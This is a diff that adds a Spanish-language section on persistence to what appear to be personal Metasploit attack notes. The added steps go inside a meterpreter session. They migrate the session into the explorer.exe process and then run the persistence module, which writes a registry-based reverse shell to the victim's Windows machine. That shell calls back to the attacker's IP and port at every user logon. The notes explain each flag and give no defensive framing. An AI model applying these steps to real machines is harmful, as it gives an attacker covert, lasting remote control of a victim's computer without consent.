@@ -122,5 +122,31 @@ msf > set lport 8888
 msf > run
 
 
+=========================================================================================
+Persistencia
+
+dentro de meterpreter
+
+ps
+
+luego ubicar el process ID de explorer
+
+luego
+
+migrate PID_del_explorer.exe
+
+por ultimo
+
+run persistence -U -p port_reverse_shell_atacker -r ip_reverse_shell_atacker -i 10
+
+
+-U significa que se iniciara la persistencia una vez que el usuario haga logon
+-p el puerto de escucha de la sesion (igual que LPORT)
+-r la direccion ip escucha (igual que LHOST)
+-i intervalo en segundos de intentos entre conexion
+
+esta persistencia queda en el registro de windows
+
+
 
 
